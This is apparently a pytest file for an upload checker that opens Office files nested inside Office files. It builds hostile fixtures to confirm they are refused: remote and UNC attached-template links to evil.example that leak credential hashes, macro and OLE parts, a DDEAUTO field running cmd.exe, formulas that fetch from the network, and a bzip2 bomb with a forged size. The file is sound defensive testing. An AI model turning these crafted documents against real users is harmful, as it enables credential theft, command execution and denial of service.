"""Office files embedded inside an Office file (adversarial review of 73ff1e3, L7, R159; and its
review round 1): a clean outer package can carry an embedded .docx that loads a remote template
(an http or UNC path leaks the reader's network-credential hash) or carries macros. Before, an
embedded package was accepted by its extension and never opened. Now every part is judged by
what it holds: an OOXML package, wherever it sits and whatever it is called, is opened and
checked one level deep with the same rules and its own content check (a document's fields, a
workbook's formulas), under budgets shared by the upload (bytes, entries, depth 1; past one,
"too large to check"); an OLE compound file is refused. The bzip2 guard (R167) is here too."""

from __future__ import annotations

import io
import random
import struct
import time
import tracemalloc
import zipfile

import pytest

from arkray.activities import storage
from tests.cpu_scale import bound, slowdown

R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
TYPES = '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'


@pytest.fixture(autouse=True)
def calibrated():
    """This process's speed measured at setup (tests/cpu_scale.py), before a test patches
    anything, for the bounds below."""
    slowdown()


def pkg(parts: dict[str, str | bytes], *, method: int = zipfile.ZIP_DEFLATED) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", method) as built:
        for name, content in parts.items():
            built.writestr(name, content)
    return out.getvalue()


def rels(*relationships: str) -> str:
    return (
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        + "".join(relationships)
        + "</Relationships>"
    )


def recognise(ext: str, content: bytes) -> object:
    """The catalog check for `ext`: True, False, or the refusal message."""
    try:
        return storage.CATALOG[ext].recognise(content[:8192], io.BytesIO(content))
    except storage.RejectedFile as refused:
        return str(refused)


def docx(parts: dict[str, str | bytes]) -> bytes:
    return pkg({"[Content_Types].xml": TYPES, "word/document.xml": "<x/>", **parts})


def clean_inner() -> bytes:
    """A benign embedded worksheet: a real OOXML package with no active content."""
    return pkg({"[Content_Types].xml": TYPES, "xl/workbook.xml": "<x/>"})


REMOTE_TEMPLATE = docx(
    {
        "word/_rels/settings.xml.rels": rels(
            f'<Relationship Id="r1" Type="{R}attachedTemplate"'
            ' Target="https://evil.example/t.dotm" TargetMode="External"/>'
        )
    }
)
UNC_TEMPLATE = docx(
    {
        "word/_rels/settings.xml.rels": rels(
            f'<Relationship Id="r1" Type="{R}attachedTemplate"'
            ' Target="\\\\evil.example\\share\\t.dotm" TargetMode="External"/>'
        )
    }
)
MACRO_INNER = docx({"word/vbaProject.bin": b"CFB"})
OLE_INNER = docx({"word/embeddings/oleObject1.bin": b"x"})


class TestEmbeddedPackages:
    @pytest.mark.parametrize(
        ("label", "inner"),
        [
            ("remote-template", REMOTE_TEMPLATE),
            ("unc-template", UNC_TEMPLATE),
            ("macros", MACRO_INNER),
            ("ole-object", OLE_INNER),
        ],
        ids=["remote-template", "unc-template", "macros", "ole-object"],
    )
    def test_an_embedded_package_with_active_content_is_refused(self, label, inner):
        outer = docx({"word/embeddings/Microsoft_Word_Document1.docx": inner})
        assert recognise("docx", outer) is False

    def test_an_embedded_package_is_checked_wherever_it_sits(self):
        for name in (
            "word/embeddings/obj.docx",
            "word/media/doc.docx",  # not under /embeddings/ but still a package part
            "xl/embeddings/Microsoft_Word_Document.docx",
        ):
            outer = pkg(
                {"[Content_Types].xml": TYPES, "word/document.xml": "<x/>", name: REMOTE_TEMPLATE}
            )
            # Review round 1: Word activates an embedded package through a `package`
            # relationship to any part, so a package is opened wherever it sits.
            assert recognise("docx", outer) is False, name

    def test_a_macro_enabled_embedding_is_refused_by_name(self):
        # A .docm/.xlsm/.pptm embedding is refused outright (not an image, not a safe package).
        for ext in ("docm", "xlsm", "pptm"):
            outer = docx({f"word/embeddings/obj.{ext}": clean_inner()})
            assert recognise("docx", outer) is False, ext

    def test_a_non_package_embedding_named_like_one_is_refused(self):
        outer = docx({"word/embeddings/obj.docx": b"not a zip at all"})
        assert recognise("docx", outer) is False

    def test_a_benign_embedded_package_passes(self):
        outer = docx({"word/embeddings/Microsoft_Excel_Worksheet.xlsx": clean_inner()})
        assert recognise("docx", outer) is True

    def test_an_embedded_image_still_passes_without_being_opened(self):
        png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
        outer = docx({"word/embeddings/image1.png": png})
        assert recognise("docx", outer) is True


class TestEmbeddedBounds:
    def test_a_package_nested_in_an_embedded_package_is_refused(self):
        """Depth 1 only: a package embedded inside an embedded package is not opened; it is
        refused so no chain of packages can be followed."""
        middle = docx({"word/embeddings/inner.docx": clean_inner()})
        outer = docx({"word/embeddings/middle.docx": middle})
        assert recognise("docx", outer) is False

    def test_a_bzip2_member_is_refused_unread_with_bounded_memory(self):
        """A crafted package whose relationships part is bzip2-compressed and understates its
        size in the central directory: the compression guard refuses it before any read, so
        it never expands (it would reach ~800 MB otherwise)."""
        big = b"<Relationships>" + b" " * (256 * 1024 * 1024) + b"</Relationships>"
        out = io.BytesIO()
        with zipfile.ZipFile(out, "w") as built:
            built.writestr("[Content_Types].xml", TYPES)
            built.writestr("word/document.xml", "<x/>")
            built.writestr(zipfile.ZipInfo("_rels/.rels"), big, compress_type=zipfile.ZIP_BZIP2)
        data = bytearray(out.getvalue())
        # Lie about the uncompressed size in the central directory so the byte pre-check passes.
        position = 0
        while True:
            position = data.find(b"PK\x01\x02", position)
            if position < 0:
                break
            name_length = struct.unpack("<H", data[position + 28 : position + 30])[0]
            if bytes(data[position + 46 : position + 46 + name_length]) == b"_rels/.rels":
                data[position + 24 : position + 28] = struct.pack("<I", 64)
            position += 4
        tracemalloc.start()
        try:
            outcome = recognise("docx", bytes(data))
            peak = tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()
        assert outcome is False
        assert peak < 16 * 1024 * 1024, peak  # unbounded, this member expanded to ~800 MB

    def test_many_embedded_packages_are_bounded_across_nesting(self):
        """The entry budget is shared across nesting: an outer package with a few dozen embedded
        packages, each holding many entries, is "too large to check" once the shared count runs
        out, quickly. (Before review round 1 this case built more entries than the outer limit
        allows, so it never reached the nesting, and answered a type mismatch.)"""
        inner = pkg(
            {"[Content_Types].xml": TYPES, "xl/workbook.xml": "<x/>"}
            | {f"xl/worksheets/sheet{n}.xml": "<x/>" for n in range(500)}
        )
        outer = docx({f"word/embeddings/obj{n}.xlsx": inner for n in range(30)})
        started = time.process_time()
        assert recognise("docx", outer) == storage.TOO_LARGE_TO_CHECK
        assert time.process_time() - started < bound(2)  # review round 2: was < 10


# --- review round 1 -------------------------------------------------------------------------------
W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
SM = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
CT = "http://schemas.openxmlformats.org/package/2006/content-types"
MAIN = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"
WORKSHEET = "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"
OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504


def workbook(formula: str = "SUM(A1:A3)", padding: int = 0) -> bytes:
    """A real workbook with one formula and, if asked, an incompressible picture (its size)."""
    types = (
        f"<Types xmlns='{CT}'><Default Extension='xml' ContentType='application/xml'/>"
        "<Default Extension='png' ContentType='image/png'/>"
        f"<Override PartName='/xl/workbook.xml' ContentType='{MAIN}'/>"
        f"<Override PartName='/xl/worksheets/sheet1.xml' ContentType='{WORKSHEET}'/></Types>"
    )
    parts: dict[str, str | bytes] = {
        "[Content_Types].xml": types,
        "xl/workbook.xml": f"<workbook xmlns='{SM}'/>",
        "xl/worksheets/sheet1.xml": f"<worksheet xmlns='{SM}'><sheetData><row r='1'><c r='A1'>"
        f"<f>{formula}</f></c></row></sheetData></worksheet>",
    }
    if padding:
        parts["xl/media/image1.png"] = b"\x89PNG\r\n\x1a\n" + random.Random(padding).randbytes(
            padding
        )
    return pkg(parts)


def document(instruction: str) -> bytes:
    """A real Word document with one simple field."""
    return pkg(
        {
            "[Content_Types].xml": TYPES,
            "word/document.xml": f"<w:document xmlns:w='{W}'><w:body><w:p><w:fldSimple"
            f" w:instr='{instruction}'><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p></w:body>"
            "</w:document>",
        }
    )


class TestEmbeddedContentChecks:
    """PARSERS-6: an embedded document's fields and an embedded workbook's formulas are checked
    too, from the upload's shared budgets."""

    def test_an_embedded_documents_fields_are_judged(self):
        dde = docx({"word/embeddings/d.docx": document('DDEAUTO c:\\\\cmd.exe "/k calc"')})
        assert recognise("docx", dde) == storage.FIELD_REFUSED
        page = docx({"word/embeddings/d.docx": document("PAGE")})
        assert recognise("docx", page) is True

    def test_an_embedded_workbooks_formulas_are_judged(self):
        fetching = docx({"word/embeddings/w.xlsx": workbook('WEBSERVICE("http://e/")')})
        assert recognise("docx", fetching) == storage.FORMULA_REFUSED
        assert recognise("docx", docx({"word/embeddings/w.xlsx": workbook()})) is True

    def test_the_check_follows_the_content_not_the_name(self):
        """A workbook under a .docx name is still a workbook to Office."""
        renamed = docx({"word/embeddings/w.docx": workbook('IMAGE("https://e/p.png")')})
        assert recognise("docx", renamed) == storage.FORMULA_REFUSED

    def test_an_embedded_document_spends_the_shared_budget(self, monkeypatch):
        monkeypatch.setattr(storage, "WORD_XML_WORK", 40)
        fields = "".join(
            f"<w:p><w:fldSimple w:instr='PAGE'><w:r><w:t>{n}</w:t></w:r></w:fldSimple></w:p>"
            for n in range(10)
        )
        inner = pkg(
            {
                "[Content_Types].xml": TYPES,
                "word/document.xml": f"<w:document xmlns:w='{W}'><w:body>{fields}</w:body>"
                "</w:document>",
            }
        )
        assert recognise("docx", docx({"word/embeddings/d.docx": inner})) == (
            storage.TOO_LARGE_TO_CHECK
        )

    def test_an_embedded_workbook_in_a_workbook(self):
        outer = pkg(
            {
                "[Content_Types].xml": TYPES,
                "xl/workbook.xml": "<x/>",
                "xl/embeddings/w.xlsx": workbook("RTD(1)"),
            }
        )
        assert recognise("xlsx", outer) == storage.FORMULA_REFUSED


class TestEmbeddedBudget:
    """PARSERS-4: embedded packages have their own byte budget; an ordinary proposal with large
    embedded workbooks passes, and past a budget the answer is "too large to check"."""

    @pytest.mark.parametrize(
        "sizes",
        [[1_000_000], [1_500_000, 1_500_000], [2_200_000, 2_200_000], [4_500_000]],
        ids=["one-1mb", "two-1.5mb", "two-2.2mb", "one-4.5mb"],
    )
    def test_an_ordinary_proposal_with_large_workbooks_passes(self, sizes):
        outer = docx(
            {
                f"word/embeddings/Microsoft_Excel_Worksheet{n}.xlsx": workbook(padding=size)
                for n, size in enumerate(sizes, 1)
            }
        )
        started = time.process_time()
        assert recognise("docx", outer) is True
        assert time.process_time() - started < bound(2)  # review round 2: was < 10

    def test_past_the_embedded_byte_budget_it_is_too_large_to_check(self, monkeypatch):
        outer = docx({f"word/embeddings/w{n}.xlsx": workbook(padding=200_000) for n in (1, 2)})
        monkeypatch.setattr(storage, "EMBEDDED_TOTAL_BYTES", 300_000)
        assert recognise("docx", outer) == storage.TOO_LARGE_TO_CHECK
        monkeypatch.setattr(storage, "EMBEDDED_TOTAL_BYTES", 10**9)
        monkeypatch.setattr(storage, "EMBEDDED_PACKAGE_BYTES", 100_000)
        assert recognise("docx", outer) == storage.TOO_LARGE_TO_CHECK

    def test_past_the_xml_budget_it_is_too_large_to_check(self, monkeypatch):
        monkeypatch.setattr(storage, "OOXML_XML_TOTAL_BYTES", 300)
        outer = docx({f"word/_rels/p{n}.xml.rels": rels() for n in range(10)})
        assert recognise("docx", outer) == storage.TOO_LARGE_TO_CHECK


class TestEmbeddedSpoofing:
    """Review round 1: what a part holds decides, not its name or where it sits."""

    @pytest.mark.parametrize(
        ("label", "parts", "expected"),
        [
            ("package-named-png", {"word/embeddings/image1.png": REMOTE_TEMPLATE}, False),
            ("benign-package-named-png", {"word/embeddings/image1.png": clean_inner()}, False),
            ("ole-named-png", {"word/embeddings/image2.png": OLE}, False),
            ("ole-in-media", {"word/media/clip.dat": OLE}, False),
            ("ole-named-xml", {"customXml/item9.xml": OLE}, False),
            ("package-in-media", {"word/media/doc.docx": REMOTE_TEMPLATE}, False),
            ("benign-package-in-media", {"word/media/sheet.xlsx": clean_inner()}, True),
            (
                "altchunk-inside",
                {"word/embeddings/d.docx": docx({"word/afchunk.rtf": "{\\rtf1}"})},
                False,
            ),
            (
                "no-content-types-inside",
                {"word/embeddings/d.docx": pkg({"word/document.xml": "<x/>"})},
                False,
            ),
            (
                "bzip2-inside",
                {
                    "word/embeddings/d.docx": pkg(
                        {"[Content_Types].xml": TYPES, "word/document.xml": "<x/>"},
                        method=zipfile.ZIP_BZIP2,
                    )
                },
                False,
            ),
            ("benign-deck", {"word/embeddings/deck.pptx": pkg(
                {"[Content_Types].xml": TYPES, "ppt/presentation.xml": "<x/>"})}, True),
        ],
        ids=lambda value: value if isinstance(value, str) else "",
    )  # fmt: skip
    def test_spoofed_embeddings(self, label, parts, expected):
        assert recognise("docx", docx(parts)) is expected

    def test_a_package_relationship_outside_embeddings(self):
        outer = docx(
            {
                "word/_rels/document.xml.rels": rels(
                    f'<Relationship Id="r5" Type="{R}package" Target="media/doc.bin.dat"/>'
                ),
                "word/media/doc.bin.dat": REMOTE_TEMPLATE,
            }
        )
        assert recognise("docx", outer) is False


# --- review round 2 (PARSERS2-3, PARSERS2-4) ------------------------------------------------------
PR = "http://schemas.openxmlformats.org/package/2006/relationships"
OFFICE_DOCUMENT = R + "officeDocument"
DOCMAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"


def renamed_workbook(main: str) -> bytes:
    """A workbook whose main part is `main`, found through _rels/.rels, with a fetching sheet."""
    last = main.rsplit("/", 1)[1]
    return pkg(
        {
            "[Content_Types].xml": f"<Types xmlns='{CT}'><Default Extension='xml'"
            " ContentType='application/xml'/>"
            f"<Override PartName='/{main}' ContentType='{MAIN}'/>"
            f"<Override PartName='/xl/worksheets/sheet1.xml' ContentType='{WORKSHEET}'/></Types>",
            "_rels/.rels": rels(
                f"<Relationship Id='rId1' Type='{OFFICE_DOCUMENT}' Target='{main}'/>"
            ),
            main: f"<workbook xmlns='{SM}'/>",
            f"xl/_rels/{last}.rels": rels(
                f"<Relationship Id='rId1' Type='{R}worksheet' Target='worksheets/sheet1.xml'/>"
            ),
            "xl/worksheets/sheet1.xml": f"<worksheet xmlns='{SM}'><sheetData><row r='1'><c r='A1'>"
            '<f>WEBSERVICE("http://example.invalid/x")</f></c></row></sheetData></worksheet>',
        }
    )


def renamed_document(main: str) -> bytes:
    body = (
        "<w:p><w:r><w:fldChar w:fldCharType='begin'/></w:r><w:r><w:instrText>"
        ' INCLUDEPICTURE "http://example.invalid/p.png" \\d </w:instrText></w:r>'
        "<w:r><w:fldChar w:fldCharType='end'/></w:r></w:p>"
    )
    return pkg(
        {
            "[Content_Types].xml": f"<Types xmlns='{CT}'><Default Extension='xml'"
            f" ContentType='application/xml'/><Override PartName='/{main}'"
            f" ContentType='{DOCMAIN}'/></Types>",
            "_rels/.rels": rels(
                f"<Relationship Id='rId1' Type='{OFFICE_DOCUMENT}' Target='{main}'/>"
            ),
            main: f"<w:document xmlns:w='{W}'><w:body>{body}</w:body></w:document>",
        }
    )


class TestReviewRound2Embedded:
    @pytest.mark.parametrize("main", ["xl/workbook.xml", "xl/workbook2.xml", "xl/book.xml"])
    def test_an_embedded_workbook_under_any_main_part_name(self, main):
        """PARSERS2-4: the check followed `xl/workbook.xml` by name; it now follows the declared
        content types, whatever the main part is called."""
        outer = docx({"word/embeddings/Microsoft_Excel_Worksheet1.xlsx": renamed_workbook(main)})
        assert recognise("docx", outer) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize("main", ["word/document.xml", "word/document2.xml", "word/main.xml"])
    def test_an_embedded_document_under_any_main_part_name(self, main):
        outer = docx({"word/embeddings/Microsoft_Word_Document1.docx": renamed_document(main)})
        assert recognise("docx", outer) == storage.FIELD_REFUSED

    def test_a_renamed_workbook_inside_a_workbook(self):
        outer = pkg(
            {
                "[Content_Types].xml": TYPES,
                "xl/workbook.xml": "<x/>",
                "xl/embeddings/w.xlsx": renamed_workbook("xl/book.xml"),
            }
        )
        assert recognise("xlsx", outer) == storage.FORMULA_REFUSED


def end_record(directory_bytes: int, entries: int, *, comment: bytes = b"") -> bytes:
    return (
        struct.pack(
            "<4s4H2LH", b"PK\x05\x06", 0, 0, entries, entries, directory_bytes, 0, len(comment)
        )
        + comment
    )


def zip64_end(directory_bytes: int, entries: int, at: int) -> bytes:
    record = struct.pack(
        "<4sQ2H2L4Q", b"PK\x06\x06", 44, 45, 45, 0, 0, entries, entries, directory_bytes, 0
    )
    locator = struct.pack("<4sLQL", b"PK\x06\x07", 0, at, 1)
    return record + locator


class TestEndRecords:
    """PARSERS2-3: the central directory's declared size is read the way zipfile reads it (its
    end record, the last one in the final 64 KiB and 22 bytes, or the ZIP64 record its locator
    points to) and checked before zipfile parses a single record."""

    @pytest.mark.parametrize(
        "data",
        [
            pkg({"[Content_Types].xml": TYPES, "word/document.xml": "<x/>"}),
            b"x" * 100 + end_record(10, 1),
            b"x" * 100 + end_record(10, 1, comment=b"note"),
            # A comment that holds a second end record: zipfile takes the last one.
            b"x" * 100 + end_record(10, 1, comment=end_record(4_000_000, 60_000)),
            # A consistent ZIP64 record (zipfile checks its offset plus size against the locator).
            b"x" * 200 + zip64_end(200, 300_000, 200) + end_record(0xFFFFFFFF, 0xFFFF),
            b"x" * 10,
            b"",
        ],
        ids=["package", "plain", "comment", "end-record-in-comment", "zip64", "short", "empty"],
    )
    def test_it_reads_what_zipfile_reads(self, data):
        reference = getattr(zipfile, "_EndRecData")  # noqa: B009 — the private reader compared
        try:
            expected = reference(io.BytesIO(data))
        except (zipfile.BadZipFile, OSError):
            expected = None
        found = storage._central_directory(io.BytesIO(data))
        # Entries total and directory size; none at all when zipfile finds no end record (review
        # round 3: the short and empty cases returned before asserting anything).
        assert found == (None if expected is None else (expected[4], expected[5]))
        # Review round 4: where the directory ends (zipfile reads it from there, less its size),
        # so the records walked before zipfile are the records zipfile parses.
        located = storage._end_record(io.BytesIO(data))
        assert located == (None if expected is None else (expected[4], expected[5], expected[9]))

    @pytest.mark.parametrize("prefix", [b"", b"MZ" + b"\x00" * 998], ids=["plain", "prefixed"])
    def test_its_directory_starts_where_zipfiles_does(self, prefix):
        data = prefix + pkg({"[Content_Types].xml": TYPES, "word/document.xml": "<x/>"})
        entries, size, location = storage._end_record(io.BytesIO(data))
        with zipfile.ZipFile(io.BytesIO(data)) as package:
            assert location - size == package.start_dir
            assert entries == len(package.infolist())

    def test_a_zip64_record_declaring_a_huge_directory(self):
        data = (
            b"PK\x03\x04"
            + b"x" * 200
            + zip64_end(2**40, 2**30, 204)
            + end_record(0xFFFFFFFF, 0xFFFF)
        )
        assert recognise("docx", data) == storage.TOO_LARGE_TO_CHECK
